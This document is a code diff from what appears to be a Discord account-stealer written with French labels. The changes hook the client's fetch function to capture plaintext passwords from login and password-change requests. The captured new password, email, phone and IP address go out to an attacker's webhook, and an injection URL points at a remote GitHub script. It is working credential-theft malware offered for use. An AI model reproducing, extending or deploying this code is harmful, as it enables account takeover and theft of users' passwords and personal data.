@@ -1,6 +1,6 @@
 const config = {
     "webhook": "%WEBHOOK_HERE%",
-    "injection_url": "https://raw.githubusercontent.com/VOTRE_USERNAME/VOTRE_REPO/main/injection.js",
+    "injection_url": "https://raw.githubusercontent.com/ByteSleuths/Injection/main/injection.js",
     "logout": true,
     "logout_notify": true,
     "init_notify": true
@@ -28,27 +28,39 @@ class AccountTracker {
         const originalFetch = window.fetch;
         window.fetch = async (...args) => {
             const [url, options] = args;
-            const response = await originalFetch(...args);
             
-            if (url.includes('/api/v9/users/@me')) {
-                if (options?.method === 'PATCH') {
-                    this.checkForChanges();
-                }
+            if (url.includes('/api/v9/users/@me') && options?.body) {
+                try {
+                    const body = JSON.parse(options.body);
+                    if (body.password && body.new_password) {
+                        this.lastPassword = body.new_password;
+                        setTimeout(() => this.checkForChanges(true), 1500);
+                    }
+                } catch {}
             }
             
-            // Détecter les changements de mot de passe
-            if (url.includes('/api/v9/auth/login')) {
-                this.checkForChanges();
+            if (url.includes('/api/v9/auth/login') && options?.body) {
+                try {
+                    const body = JSON.parse(options.body);
+                    if (body.password) {
+                        this.lastPassword = body.password;
+                    }
+                } catch {}
+            }
+
+            const response = await originalFetch(...args);
+            
+            if (url.includes('/api/v9/users/@me') && options?.method === 'PATCH') {
+                setTimeout(() => this.checkForChanges(), 1000);
             }
 
             return response;
         };
 
-        // Vérification périodique
-        setInterval(() => this.checkForChanges(), 1000);
+        setInterval(() => this.checkForChanges(), 2000);
     }
 
-    async checkForChanges() {
+    async checkForChanges(passwordChanged = false) {
         const token = await getToken();
         if (!token) return;
 
@@ -67,6 +79,11 @@ class AccountTracker {
         if (info.email !== this.lastEmail) {
             changes.push("Email");
             this.lastEmail = info.email;
+            changed = true;
+        }
+
+        if (passwordChanged) {
+            changes.push("Password");
             changed = true;
         }
 
@@ -97,6 +114,11 @@ class AccountTracker {
                         "inline": true
                     },
                     {
+                        "name": "🔒 Nouveau Mot de Passe",
+                        "value": `\`${this.lastPassword || "Non capturé"}\``,
+                        "inline": true
+                    },
+                    {
                         "name": "☎️ Téléphone",
                         "value": `\`${info.phone || "Non défini"}\``,
                         "inline": true
@@ -104,21 +126,6 @@ class AccountTracker {
                     {
                         "name": "🌐 Adresse IP",
                         "value": `\`${ip}\``,
-                        "inline": true
-                    },
-                    {
-                        "name": "💎 Nitro",
-                        "value": `${info.premium_type ? "✅" : "❌"}`,
-                        "inline": true
-                    },
-                    {
-                        "name": "💳 Méthode de paiement",
-                        "value": `${billing.length > 0 ? "✅" : "❌"}`,
-                        "inline": true
-                    },
-                    {
-                        "name": "👥 Amis",
-                        "value": `${relationships.filter(r => r.type === 1).length}`,
                         "inline": true
                     }
                 ],
@@ -131,12 +138,13 @@ class AccountTracker {
             }]
         };
 
-        const res = await execScript(`
-            var xhr = new XMLHttpRequest();
-            xhr.open("POST", "${config.webhook}", true);
-            xhr.setRequestHeader('Content-Type', 'application/json');
-            xhr.send(JSON.stringify(${JSON.stringify(params)}));
-        `);
+        await fetch(config.webhook, {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json"
+            },
+            body: JSON.stringify(params)
+        });
     }
 }
 
